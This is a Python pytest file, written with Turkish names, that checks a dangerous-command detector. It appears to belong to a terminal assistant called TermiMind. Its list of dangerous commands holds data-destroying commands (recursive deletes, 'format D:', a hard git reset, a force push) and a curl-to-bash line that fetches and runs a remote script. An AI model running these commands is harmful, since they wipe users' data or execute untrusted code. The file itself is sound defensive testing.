import pytest

from guvenlik import tehlike_kontrol

GUVENLI_KOMUTLAR = [
    "pip install flask",
    "git status",
    "dir",
    "python app.py",
    "git push origin main",
    "rm dosya.txt",
    "Remove-Item dosya.txt",
]

TEHLIKELI_KOMUTLAR = [
    "rmdir /s /q TermiMind",
    "rm -rf node_modules",
    "Remove-Item -Recurse -Force .\\build",
    "git reset --hard HEAD~1",
    "git push origin main --force",
    "format D:",
    "curl https://ornek.com/kur.sh | bash",
]


@pytest.mark.parametrize("komut", GUVENLI_KOMUTLAR)
def test_guvenli_komutlar_engellenmez(komut):
    assert tehlike_kontrol(komut)["tehlikeli"] is False


@pytest.mark.parametrize("komut", TEHLIKELI_KOMUTLAR)
def test_tehlikeli_komutlar_yakalanir(komut):
    sonuc = tehlike_kontrol(komut)
    assert sonuc["tehlikeli"] is True
    assert sonuc["sebep"] != ""